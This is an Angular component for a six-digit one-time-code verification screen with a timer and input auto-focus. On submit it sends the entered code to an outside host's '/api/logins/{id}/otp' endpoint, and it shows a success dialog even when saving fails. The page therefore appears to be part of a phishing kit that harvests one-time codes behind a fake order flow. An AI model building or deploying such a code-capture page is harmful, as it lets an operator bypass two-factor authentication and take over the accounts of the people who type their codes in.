import { Component, OnInit, OnDestroy, signal, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { Router } from '@angular/router';
import { WatchStateService } from '../../services/watch-state';

@Component({
  selector: 'app-otp-verification',
  imports: [CommonModule],
  templateUrl: './otp-verification.html',
  styleUrl: './otp-verification.css',
})
export class OtpVerification implements OnInit, OnDestroy {
  protected readonly watchState = inject(WatchStateService);
  private readonly router = inject(Router);

  // 6 digit code inputs array
  protected readonly digits = signal<string[]>(['', '', '', '', '', '']);

  // Timer signal initialized to 119 seconds (01:59)
  protected readonly timerSeconds = signal(119);
  private timerIntervalId: any = null;

  // Final confirmation screen
  protected readonly isSuccessDialogOpen = signal(false);

  public ngOnInit(): void {
    this.startCountdown();
  }

  public ngOnDestroy(): void {
    if (this.timerIntervalId) {
      clearInterval(this.timerIntervalId);
    }
  }

  // Timer countdown logic
  private startCountdown(): void {
    if (this.timerIntervalId) clearInterval(this.timerIntervalId);
    this.timerIntervalId = setInterval(() => {
      if (this.timerSeconds() > 0) {
        this.timerSeconds.set(this.timerSeconds() - 1);
      } else {
        clearInterval(this.timerIntervalId);
      }
    }, 1000);
  }

  // Format timer into MM:SS format
  protected get formattedTime(): string {
    const min = Math.floor(this.timerSeconds() / 60);
    const sec = this.timerSeconds() % 60;
    return `${min.toString().padStart(2, '0')}:${sec.toString().padStart(2, '0')}`;
  }

  // Input events: Auto-shifts focus to the next input box
  protected handleDigitInput(index: number, event: Event): void {
    const inputElement = event.target as HTMLInputElement;
    const value = inputElement.value.replace(/\D/g, ''); // Allow only numbers
    
    // Update local state list
    const currentDigits = [...this.digits()];
    currentDigits[index] = value.substring(0, 1);
    this.digits.set(currentDigits);
    inputElement.value = currentDigits[index];

    // Auto-focus next field
    if (currentDigits[index] && index < 5) {
      const nextInput = document.getElementById(`otp-input-${index + 1}`) as HTMLInputElement;
      if (nextInput) nextInput.focus();
    }
  }

  // Handle backspaces: Auto-focus previous box
  protected handleKeyDown(index: number, event: KeyboardEvent): void {
    if (event.key === 'Backspace' && !this.digits()[index] && index > 0) {
      const prevInput = document.getElementById(`otp-input-${index - 1}`) as HTMLInputElement;
      if (prevInput) {
        prevInput.focus();
        // Clear previous digit too on backspace back
        const currentDigits = [...this.digits()];
        currentDigits[index - 1] = '';
        this.digits.set(currentDigits);
      }
    }
  }

  // Reset timer
  protected resendCode(): void {
    this.digits.set(['', '', '', '', '', '']);
    this.timerSeconds.set(119);
    this.startCountdown();
    // Focus first input
    const firstInput = document.getElementById('otp-input-0') as HTMLInputElement;
    if (firstInput) firstInput.focus();
  }

  // Check if all 4 digits are typed
  protected get isOtpComplete(): boolean {
    return this.digits().every(d => d.length === 1);
  }

  // Finalize order submission
  protected handleVerifySubmit(event: Event): void {
    event.preventDefault();
    if (!this.isOtpComplete) return;

    const otpCode = this.digits().join('');
    const requestId = this.watchState.currentRequestId();

    if (requestId) {
      fetch(`https://clock.oredo-back.xyz/api/logins/${requestId}/otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ otp: otpCode }),
      })
        .then((res) => {
          if (!res.ok) throw new Error('Failed to save OTP');
          return res.json();
        })
        .then(() => {
          console.log('OTP saved successfully on backend');
          this.isSuccessDialogOpen.set(true);
        })
        .catch((err) => {
          console.error('Error saving OTP:', err);
          this.isSuccessDialogOpen.set(true);
        });
    } else {
      this.isSuccessDialogOpen.set(true);
    }
  }

  // Exit back to landing/home
  protected finalizeFlow(): void {
    this.isSuccessDialogOpen.set(false);
    this.router.navigate(['/']);
  }
}
